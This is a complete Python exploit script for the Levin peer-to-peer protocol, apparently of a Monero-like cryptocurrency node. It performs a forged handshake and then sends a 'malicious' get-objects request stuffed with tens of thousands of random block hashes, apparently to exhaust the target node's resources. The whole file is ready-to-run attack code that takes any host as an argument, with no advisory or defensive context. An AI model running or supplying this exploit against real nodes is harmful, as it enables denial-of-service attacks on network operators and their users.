#!/usr/bin/env python3
import socket
import struct
import os
import sys
import time

# Levin protocol constants
LEVIN_SIGNATURE = 0x0101010101012101
LEVIN_PACKET_REQUEST = 0x00000001
LEVIN_PROTOCOL_VER = 1

# Command IDs
CMD_HANDSHAKE = 1001
CMD_REQUEST_GET_OBJECTS = 2003

# Portable storage constants
PS_SIGNATURE_A = 0x01011101
PS_SIGNATURE_B = 0x01020101
PS_FORMAT_VER = 1

# Type IDs
TYPE_INT64 = 1
TYPE_UINT64 = 5
TYPE_UINT32 = 6
TYPE_UINT8 = 8
TYPE_STRING = 10
TYPE_BOOL = 11
TYPE_OBJECT = 12

# Testnet network ID
NETWORK_ID_TESTNET = bytes([
    0x11, 0x10, 0x01, 0x11, 0x01, 0x01, 0x11, 0x01,
    0x10, 0x11, 0x01, 0x11, 0x01, 0x11, 0x21, 0x64
])


def encode_varint(n):
    if n <= 63:
        return bytes([(n << 2) | 0])
    elif n <= 16383:
        return struct.pack('<H', (n << 2) | 1)
    elif n <= 1073741823:
        return struct.pack('<I', (n << 2) | 2)
    else:
        return struct.pack('<Q', (n << 2) | 3)


def make_ps_header():
    return struct.pack('<II', PS_SIGNATURE_A, PS_SIGNATURE_B) + bytes([PS_FORMAT_VER])


def make_entry(name, type_id, data):
    return bytes([len(name)]) + name.encode() + bytes([type_id]) + data


def make_string_entry(name, data):
    return make_entry(name, TYPE_STRING, encode_varint(len(data)) + data)


def make_uint64_entry(name, val):
    return make_entry(name, TYPE_UINT64, struct.pack('<Q', val))


def make_int64_entry(name, val):
    return make_entry(name, TYPE_INT64, struct.pack('<q', val))


def make_uint32_entry(name, val):
    return make_entry(name, TYPE_UINT32, struct.pack('<I', val))


def make_bool_entry(name, val):
    return make_entry(name, TYPE_BOOL, bytes([1 if val else 0]))


def make_object_entry(name, entries):
    obj_data = encode_varint(len(entries))
    for e in entries:
        obj_data += e
    return make_entry(name, TYPE_OBJECT, obj_data)


def make_levin_header(command, payload_size, have_return, is_request=True):
    flags = LEVIN_PACKET_REQUEST if is_request else 0x00000002
    return struct.pack('<QQBIIII',
        LEVIN_SIGNATURE,
        payload_size,
        1 if have_return else 0,
        command,
        0,
        flags,
        LEVIN_PROTOCOL_VER
    )


def build_handshake_payload():
    node_data_entries = [
        make_string_entry("network_id", NETWORK_ID_TESTNET),
        make_uint64_entry("peer_id", struct.unpack('<Q', os.urandom(8))[0]),
        make_int64_entry("local_time", int(time.time())),
        make_uint32_entry("my_port", 0),
    ]

    payload_data_entries = [
        make_uint64_entry("current_height", 1),
        make_string_entry("top_id", b'\x00' * 32),
        make_uint64_entry("last_checkpoint_height", 0),
        make_uint64_entry("core_time", int(time.time())),
        make_string_entry("client_version", b"0.0.0.382[deadbeef]"),
        make_bool_entry("non_pruning_mode_enabled", False),
    ]

    maintrs_entries = [
        make_string_entry("maintainers_info_buff", b''),
        make_string_entry("sign", b'\x00' * 64),
    ]

    root_entries = [
        make_object_entry("node_data", node_data_entries),
        make_object_entry("payload_data", payload_data_entries),
        make_object_entry("maintrs_entry", maintrs_entries),
    ]

    payload = make_ps_header()
    payload += encode_varint(len(root_entries))
    for e in root_entries:
        payload += e

    return payload


def build_malicious_get_objects(num_hashes):
    blocks_blob = os.urandom(32 * num_hashes)

    root_entries = [
        make_string_entry("txs", b''),
        make_string_entry("blocks", blocks_blob),
    ]

    payload = make_ps_header()
    payload += encode_varint(len(root_entries))
    for e in root_entries:
        payload += e

    return payload


def recv_levin_response(sock, timeout=10):
    sock.settimeout(timeout)
    try:
        header = sock.recv(33)
        if len(header) < 33:
            return None, None

        sig, size, have_ret, cmd, ret_code, flags, proto = struct.unpack('<QQBIIII', header)

        if sig != LEVIN_SIGNATURE:
            return None, None

        payload = b''
        remaining = size
        while remaining > 0:
            chunk = sock.recv(min(remaining, 65536))
            if not chunk:
                break
            payload += chunk
            remaining -= len(chunk)

        return cmd, payload
    except socket.timeout:
        return None, None


def exploit(host, port, num_hashes=50000):
    print(f"[*] connecting to {host}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)

    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[-] connection failed: {e}")
        return False

    print("[*] sending handshake")
    hs_payload = build_handshake_payload()
    hs_header = make_levin_header(CMD_HANDSHAKE, len(hs_payload), have_return=True)
    sock.sendall(hs_header + hs_payload)

    cmd, resp = recv_levin_response(sock)
    if cmd != CMD_HANDSHAKE:
        print(f"[-] handshake failed, got cmd={cmd}")
        sock.close()
        return False

    print("[+] handshake ok")

    print(f"[*] building malicious request with {num_hashes} hashes ({num_hashes * 32} bytes)")
    mal_payload = build_malicious_get_objects(num_hashes)
    mal_header = make_levin_header(CMD_REQUEST_GET_OBJECTS, len(mal_payload), have_return=False)

    print("[*] sending NOTIFY_REQUEST_GET_OBJECTS")
    sock.sendall(mal_header + mal_payload)

    print("[+] payload sent")
    print("[*] waiting to observe effect (check target node logs and resources)")

    time.sleep(5)
    sock.close()

    return True


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <host> [port] [num_hashes]")
        print(f"  defaults: port=11311 (testnet), num_hashes=50000")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11311
    num_hashes = int(sys.argv[3]) if len(sys.argv) > 3 else 50000

    exploit(host, port, num_hashes)
